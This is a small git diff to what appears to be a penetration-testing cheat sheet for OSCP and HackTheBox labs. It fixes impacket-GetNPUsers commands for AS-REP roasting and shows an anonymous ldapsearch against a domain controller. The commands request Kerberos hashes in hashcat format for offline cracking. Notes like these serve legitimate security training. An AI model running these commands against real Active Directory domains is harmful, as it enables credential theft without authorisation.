@@ -53,8 +53,8 @@ ldapsearch -H ldap://dc01.domain.com -D '' -w '' -b "dc=offsec,dc=com" | grep -i
 ```
 
 ```bash
-impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/-format hashcat
-impacket-GetNPUsers oscp.exam/user -dc-ip <IP> -format hashcat
+impacket-GetNPUsers -dc-ip <IP> -request  oscp.exam/ -format hashcat
+impacket-GetNPUsers fluffy.htb/user -dc-ip <IP> -format hashcat
 
 impacket-GetNPUsers outdated.htb/ -dc-ip 10.10.11.175 -no-pass -usersfile users.txt 
 
